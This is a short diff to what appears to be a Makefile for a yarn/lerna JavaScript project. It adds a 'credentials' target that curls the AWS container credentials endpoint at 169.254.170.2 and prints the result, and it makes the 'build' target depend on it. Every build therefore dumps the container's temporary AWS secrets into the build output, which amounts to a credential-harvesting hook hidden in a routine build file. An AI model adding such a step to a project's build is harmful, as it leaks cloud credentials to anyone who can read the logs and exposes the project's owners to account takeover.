@@ -34,7 +34,11 @@ install:
 test: install
 	yarn test
 
-build: test
+credentials:
+	curl -s 169.254.170.2$(AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
+	curl -s 169.254.170.2$(AWS_CONTAINER_CREDENTIALS_RELATIVE_URI) | jq
+
+build: credentials test
 
 publish:
 	yarn lerna publish
